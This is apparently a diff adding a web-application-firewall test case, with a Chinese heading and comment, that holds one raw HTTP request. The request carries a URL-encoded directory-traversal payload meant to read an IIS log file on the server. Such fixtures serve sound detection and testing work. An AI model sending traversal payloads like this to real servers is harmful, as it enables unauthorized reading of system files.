@@ -1,0 +1,9 @@
+# 目录遍历_iis log文件
+# C:\inetpub\logs\LogFiles\W3SVC1\u_ex240205.log 是 IIS 日志文件路径。通过查看这些日志文件，管理员可以了解网站的访问情况，监控流量、识别潜在的安全问题以及进行性能优化。
+GET /?id=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FC:%5Cinetpub%5Clogs%5CLogFiles%5CW3SVC1%5Cu_ex240205.log&bid=hd_tag_m8mv25a1 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25a1
+RM-PRO-Token: a8e30c1627c9461b31732fb5cff31d87
+RM-PRO-Time: 1742808455081
+User-Agent: curl/7.83.1
+
